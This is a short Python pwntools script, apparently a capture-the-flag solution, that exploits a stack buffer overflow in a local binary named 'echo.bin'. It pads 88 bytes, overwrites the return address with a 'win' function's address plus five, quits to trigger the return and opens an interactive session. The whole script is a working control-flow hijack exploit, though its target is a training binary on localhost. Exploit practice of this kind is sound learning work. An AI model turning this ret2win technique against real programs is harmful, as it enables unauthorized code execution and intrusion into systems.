from pwn import *

if 'REMOTE' in args:
    p = remote("localhost", 8050)
else:
    p = process("dist/echo.bin")

e = ELF("dist/echo.bin")
p.sendlineafter("> ", flat({ 80 + 8: p64(e.symbols['win'] + 5) }))
p.sendlineafter("> ", "q")
p.interactive()